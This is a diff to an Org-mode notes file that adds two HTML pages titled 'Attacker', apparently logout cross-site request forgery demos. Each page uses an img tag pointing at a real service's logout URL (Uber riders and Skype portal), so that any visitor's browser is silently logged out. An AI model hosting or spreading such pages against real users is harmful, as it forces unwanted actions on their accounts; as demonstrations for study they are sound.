@@ -74,3 +74,21 @@ how:
 </body>
 </html>
 #+END_SRC
+* Uber logout
+#+BEGIN_SRC html :tangle  uberlogout.html
+<html>
+<head><title>Attacker</title></head>
+<body>
+<img src="https://riders.uber.com/logout"/>
+</body>
+</html>
+#+END_SRC
+* Skype logout
+#+BEGIN_SRC html :tangle skypelogout.html
+<html>
+<head><title>Attacker</title></head>
+<body>
+<img src="https://secure.skype.com/portal/logout"/>
+</body>
+</html>
+#+END_SRC
